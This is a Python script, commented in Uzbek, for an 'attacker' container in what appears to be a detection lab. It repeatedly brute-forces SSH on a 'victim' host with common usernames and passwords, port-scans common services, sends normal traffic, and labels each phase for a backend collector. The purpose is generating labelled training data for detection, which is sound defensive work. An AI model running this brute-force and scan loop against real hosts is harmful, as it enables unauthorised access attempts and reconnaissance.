"""
Attacker container — victim ga avtomatik hujum qiladi.
Har sikl: brute_force → port_scan → normal → takrorlanadi.
"""
import time
import random
import socket
import logging
import requests
import paramiko

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [attacker] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S',
)
log = logging.getLogger(__name__)

VICTIM_HOST  = 'victim'
BACKEND_API  = 'http://backend:8000/api'
API_KEY      = 'cyberguard-demo-key'

USERNAMES = ['root', 'admin', 'user', 'ubuntu', 'postgres', 'mysql',
             'oracle', 'guest', 'operator', 'manager', 'deploy', 'www-data']
PASSWORDS = ['password', '123456', 'admin', 'root', 'password123',
             '12345678', 'qwerty', 'abc123', 'letmein', 'welcome',
             'monkey', 'dragon', 'pass123', '1234', 'test', 'test123',
             'admin123', 'secret', 'changeme', 'default']

SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443,
              445, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443]


def wait_for_victim(timeout=120):
    log.info("Victim SSH tayyor bo'lishini kutmoqda...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            s = socket.socket()
            s.settimeout(2)
            if s.connect_ex((VICTIM_HOST, 22)) == 0:
                s.close()
                log.info("Victim SSH tayyor!")
                return True
            s.close()
        except Exception:
            pass
        time.sleep(3)
    log.warning("Victim SSH ulanmadi (timeout)")
    return False


def brute_force_ssh(count: int = 35) -> dict:
    log.info("==> Brute Force SSH: %d ta urinish", count)
    fails = 0
    hits  = 0
    for _ in range(count):
        user = random.choice(USERNAMES)
        pwd  = random.choice(PASSWORDS)
        ssh  = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(
                VICTIM_HOST, port=22,
                username=user, password=pwd,
                timeout=3, allow_agent=False, look_for_keys=False,
            )
            ssh.close()
            hits += 1
        except paramiko.AuthenticationException:
            fails += 1
        except Exception:
            fails += 1
        time.sleep(random.uniform(0.08, 0.4))
    log.info("Brute force: %d fail, %d success", fails, hits)
    return {'type': 'brute_force', 'fail': fails, 'success': hits}


def port_scan() -> list:
    log.info("==> Port Scan: %d port", len(SCAN_PORTS))
    open_ports = []
    for port in SCAN_PORTS:
        try:
            s = socket.socket()
            s.settimeout(0.4)
            if s.connect_ex((VICTIM_HOST, port)) == 0:
                open_ports.append(port)
            s.close()
        except Exception:
            pass
    log.info("Port scan: ochiq portlar = %s", open_ports)
    return open_ports


def normal_traffic(count: int = 5):
    log.info("==> Normal HTTP trafik: %d so'rov", count)
    for _ in range(count):
        try:
            requests.get(f"http://{VICTIM_HOST}/", timeout=3)
        except Exception:
            pass
        time.sleep(random.uniform(1.0, 3.0))


def notify_backend(label: str):
    """Backend ga log yig'ish va auto-label qilishni aytadi."""
    try:
        resp = requests.post(
            f"{BACKEND_API}/lab/auto-collect/",
            json={'label': label},
            headers={'X-API-Key': API_KEY},
            timeout=10,
        )
        if resp.ok:
            d = resp.json()
            log.info("Backend collect: label=%s failed=%s tcp=%s",
                     d.get('label'), d.get('failed_logins'), d.get('tcp_connections'))
    except Exception as e:
        log.debug("Backend notify xatosi: %s", e)


def run():
    wait_for_victim()
    time.sleep(5)
    cycle = 0

    while True:
        cycle += 1
        log.info("====== Sikl %d ======", cycle)

        # 1. Brute Force
        brute_force_ssh(count=random.randint(25, 50))
        notify_backend('brute_force')
        time.sleep(random.uniform(40, 80))

        # 2. Port Scan
        port_scan()
        notify_backend('port_scan')
        time.sleep(random.uniform(20, 40))

        # 3. Normal
        normal_traffic(count=random.randint(3, 8))
        notify_backend('normal')
        time.sleep(random.uniform(60, 120))

        log.info("====== Sikl %d tugadi ======", cycle)


if __name__ == '__main__':
    run()
